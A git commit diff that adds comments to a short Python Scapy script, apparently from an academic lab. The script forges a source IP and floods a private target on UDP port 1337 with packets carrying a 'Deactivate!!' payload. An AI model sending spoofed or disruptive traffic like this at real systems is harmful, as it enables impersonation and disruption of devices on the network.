9528d4457233864ebe02118ad6c7714cc2c42841
Brandon <Brandon.Kamaka@afit.edu>
2019-01-11 11:41:22 -0500

    Added comments for maintainability

--- mxSentinel.py
+++ mxSentinel.py
@@ -1,19 +1,21 @@
 from scapy.all import *
 from scapy.layers.inet import *
 
-
+# Setup packet parameters
 target = "10.12.1.4"
 spoof = "10.204.0.7"
 payload = "Deactivate!!"
 packets = []
 
 def packet_craft(source_port):
+    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
     pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
     return pkt
 
 
 print "Beginning packet crafting ...\n"
 
+# First we craft a large number of packets using a random ephemeral port
 for i in range(10):
     source_port = random.randint(1024, 65535)
     temp_packet = packet_craft(source_port)
@@ -22,6 +24,7 @@ for i in range(10):
 print "done crafting packets!\n"
 print "\nBeginning flood ...\n"
 
+# Initiate a packet flood using our crafted packets
 for p in packets:
     send(p)
 
